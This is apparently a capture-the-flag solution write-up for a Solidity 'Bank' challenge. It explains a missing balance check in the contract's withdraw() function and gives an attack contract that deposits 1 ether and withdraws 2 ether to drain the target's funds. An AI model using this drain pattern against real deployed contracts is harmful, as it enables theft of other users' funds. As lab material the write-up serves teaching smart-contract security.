# Bank

## Solution :

To validate this challenge, the user needs to empty the contract's balance.

To do that, he needs to deposit some ethers on his account with the `deposit()` function.

And after that, he needs to call the `withdraw()` function.

The withdraw function, check if the balance of the user if more than `0 ether` and if the balance has enough ethers to send to the user.

If these conditions are true, then the function send the amount of ethers asked to the user without checking if the user has enough ethers on his account.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/easyChalls/Bank.sol";

contract attackBank {
	Bank originalContract;

	constructor(address _originalContract) public {
		originalContract = Bank(_originalContract);
	}

	function exploit() public payable {
		require(msg.value == 1 ether);
		address(originalContract).call.value(1 ether)(abi.encodeWithSignature("deposit()"));
		originalContract.withdraw(2 ether);
	}

}
```